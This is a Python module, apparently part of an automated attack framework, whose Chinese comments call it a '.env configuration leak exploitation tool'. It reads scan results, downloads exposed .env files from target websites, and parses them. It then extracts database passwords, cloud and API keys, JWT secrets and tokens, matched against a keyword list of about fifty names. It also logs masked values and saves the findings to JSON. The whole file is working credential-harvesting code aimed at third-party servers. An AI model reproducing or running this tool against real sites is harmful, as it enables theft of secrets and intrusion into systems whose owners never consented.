#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
env_leak.py - .env 配置泄露利用工具模块
由调度系统调用，下载 .env 文件并提取数据库密码/API密钥等敏感凭据
依赖: requests
"""

import os
import json
import re
import datetime
import requests

from tools import RESULTS_BASE

# ==================== 工具接口变量 ====================
TOOL_NAME = ".env 配置泄露利用"
TOOL_ID = "env_leak"
TOOL_DESC = "下载 .env 文件，提取数据库密码/API密钥等50+类敏感凭据"
TOOL_CATEGORY = "info_leak"

# ==================== 配置区 ====================
TIMEOUT = 10
MAX_DOWNLOAD_SIZE = 100 * 1024 * 1024  # 100MB
VERIFY_SSL = False

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Connection": "close",
}

# ==================== 颜色与日志 ====================
class Colors:
    GREEN = '\033[92m'; RED = '\033[91m'; YELLOW = '\033[93m'
    BLUE = '\033[94m'; CYAN = '\033[96m'; BOLD = '\033[1m'; RESET = '\033[0m'

class Logger:
    def info(self, msg): print(f"{Colors.BLUE}[INFO] {msg}{Colors.RESET}")
    def success(self, msg): print(f"{Colors.GREEN}[+] {msg}{Colors.RESET}")
    def warning(self, msg): print(f"{Colors.YELLOW}[!] {msg}{Colors.RESET}")
    def error(self, msg): print(f"{Colors.RED}[-] {msg}{Colors.RESET}")
    def raw(self, msg): print(msg)

logger = Logger()

# ==================== CREDENTIAL_KEYWORDS ====================
CREDENTIAL_KEYWORDS = [
    "DB_PASSWORD", "DB_USERNAME", "DB_HOST", "DB_PORT", "DB_NAME", "DATABASE_URL",
    "APP_KEY", "APP_SECRET", "SECRET_KEY", "SECRET_TOKEN",
    "API_KEY", "API_SECRET", "API_TOKEN", "ACCESS_KEY", "ACCESS_SECRET",
    "JWT_SECRET", "JWT_KEY", "ENCRYPTION_KEY",
    "MAIL_PASSWORD", "MAIL_USERNAME", "SMTP_PASSWORD",
    "REDIS_PASSWORD", "REDIS_URL",
    "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_REGION",
    "ALIBABA_ACCESS_KEY", "TENCENT_SECRET_ID",
    "ADMIN_PASSWORD", "ADMIN_EMAIL",
    "MYSQL_PASSWORD", "MYSQL_ROOT_PASSWORD",
    "POSTGRES_PASSWORD", "MONGO_URI",
    "LDAP_PASSWORD", "RABBITMQ_PASSWORD",
    "OSS_ACCESS_KEY", "OSS_SECRET_KEY",
    "SENTRY_DSN", "STRIPE_KEY", "PAYPAL_CLIENT_ID",
    "GITHUB_TOKEN", "GITLAB_TOKEN",
    "PASSWORD", "PASSWD", "PWD",
    "TOKEN", "SECRET", "KEY",
]

# ==================== 通用下载器 ====================
def safe_download(url, stream=False, max_size=MAX_DOWNLOAD_SIZE):
    """带限速和异常处理的通用下载，防止内存炸弹"""
    try:
        resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT,
                           verify=VERIFY_SSL, stream=stream, allow_redirects=True)
        if resp.status_code != 200:
            return None
        if stream:
            chunks = []
            total = 0
            for chunk in resp.iter_content(chunk_size=8192):
                total += len(chunk)
                if total > max_size:
                    logger.warning(f"文件过大 (>100MB)，截断: {url}")
                    break
                chunks.append(chunk)
            return b"".join(chunks)
        else:
            if len(resp.content) > max_size:
                logger.warning(f"响应过大 (>100MB)，截断: {url}")
                return resp.content[:max_size]
            return resp.content
    except Exception as e:
        logger.warning(f"下载失败: {url} -> {e}")
        return None


# ==================== 敏感值脱敏 ====================
def mask_value(value):
    """脱敏敏感值：显示前4个字符 + ***"""
    if not value:
        return "***"
    if len(value) <= 4:
        return value[:1] + "***"
    return value[:4] + "***"


# ==================== .env 文件解析 ====================
def parse_env_content(text):
    """解析 .env 文本为 KEY=VALUE 字典，过滤注释和非键值行"""
    credentials = {}
    for line in text.split("\n"):
        line = line.strip()
        if not line or line.startswith("#") or line.startswith("//"):
            continue
        if "<" in line or ">" in line or "{" in line or "function" in line:
            continue
        match = re.match(r'^([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.+)$', line)
        if not match:
            continue
        key, value = match.group(1), match.group(2).strip()
        if (value.startswith('"') and value.endswith('"')) or \
           (value.startswith("'") and value.endswith("'")):
            value = value[1:-1]
        if not value or value in ["null", "None", "none", "empty", ""]:
            continue
        credentials[key] = value
    return credentials


# ==================== 凭据提取 ====================
def extract_sensitive(credentials):
    """从解析结果中筛选匹配 CREDENTIAL_KEYWORDS 的敏感凭据"""
    sensitive = []
    matched_keys = set()
    for kw in CREDENTIAL_KEYWORDS:
        for key, val in credentials.items():
            if kw.upper() in key.upper() and key not in matched_keys:
                matched_keys.add(key)
                sensitive.append({
                    "key": key,
                    "value": val,
                    "masked_value": mask_value(val)
                })
    return sensitive


# ==================== 工具入口 ====================
def execute(scan_result, target_info):
    """
    执行 .env 配置泄露利用。

    Args:
        scan_result: dict, saomiao.py 输出的扫描结果（已解析为 dict）
        target_info: dict, 包含 domain, ip, base_url

    Returns:
        dict: 标准化结果
    """
    domain = target_info.get("domain", "")

    all_credentials = []
    errors = []

    # 1. 提取 .env 相关目标
    env_targets = []

    for d in scan_result.get("directories", []):
        path_lower = d.get("path", "").lower()
        if d.get("status") == 200:
            if any(x in path_lower for x in [".env", ".env.local", ".env.development", ".env.production"]):
                if not any(e["path"] == d["path"] for e in env_targets):
                    env_targets.append(d)

    for issue in scan_result.get("security_issues", []):
        p = issue.get("path", "")
        itype = issue.get("type", "")
        if "环境配置泄露" in itype or ".env" in p.lower():
            if not any(e.get("path") == p for e in env_targets):
                env_targets.append({
                    "path": p,
                    "status": 200,
                    "source": "security_issue",
                    "severity": issue.get("severity", "")
                })

    logger.info(f"从扫描结果提取到 {len(env_targets)} 个 .env 目标")

    if not env_targets:
        return {
            "tool": "env_leak",
            "target": domain,
            "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "status": "failed",
            "summary": "未发现 .env 暴露目标",
            "credentials": [],
            "total_keys_found": 0,
            "errors": []
        }

    # 2. 下载并解析每个 .env 文件
    for target in env_targets:
        url = target["path"]
        logger.info(f"下载 .env 文件: {url}")

        try:
            content = safe_download(url)
            if not content:
                errors.append(f"下载失败: {url}")
                continue

            text = content.decode("utf-8", errors="ignore")
            credentials = parse_env_content(text)
            sensitive = extract_sensitive(credentials)

            if sensitive:
                logger.success(f"提取 {len(sensitive)} 组敏感凭据: {url}")
                for cred in sensitive:
                    logger.raw(f"    {cred['key']} = {cred['masked_value']}")
                    all_credentials.append({
                        "file": url,
                        "key": cred["key"],
                        "value": cred["masked_value"]
                    })
            else:
                logger.info(f".env 文件无敏感凭据: {url}")

        except Exception as e:
            errors.append(f"处理 {url} 时出错: {str(e)}")
            logger.error(f"处理 {url} 时出错: {e}")

    # 3. 确定最终状态
    if not all_credentials and errors:
        status = "failed"
        summary = f"处理失败，{len(errors)} 个错误"
    elif not all_credentials:
        status = "success"
        summary = "未发现敏感凭据"
    elif errors:
        status = "partial"
        summary = f"提取 {len(all_credentials)} 组敏感凭据（{len(errors)} 个错误）"
    else:
        status = "success"
        summary = f"提取 {len(all_credentials)} 组敏感凭据"

    # 4. 保存结果到文件
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    result_dir = os.path.join(RESULTS_BASE, "env_leak")
    os.makedirs(result_dir, exist_ok=True)
    result_file = os.path.join(result_dir, f"env_leak_{domain}_{ts}.json")

    result_data = {
        "scan_time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "target": target_info,
        "total_env_files": len(env_targets),
        "total_keys_found": len(all_credentials),
        "credentials": all_credentials,
        "errors": errors
    }

    with open(result_file, 'w', encoding='utf-8') as f:
        json.dump(result_data, f, ensure_ascii=False, indent=2)

    logger.raw("\n" + "=" * 60)
    logger.info(f"结果已保存至: {result_file}")

    return {
        "tool": "env_leak",
        "target": domain,
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "status": status,
        "summary": summary,
        "credentials": all_credentials,
        "total_keys_found": len(all_credentials),
        "errors": errors
    }
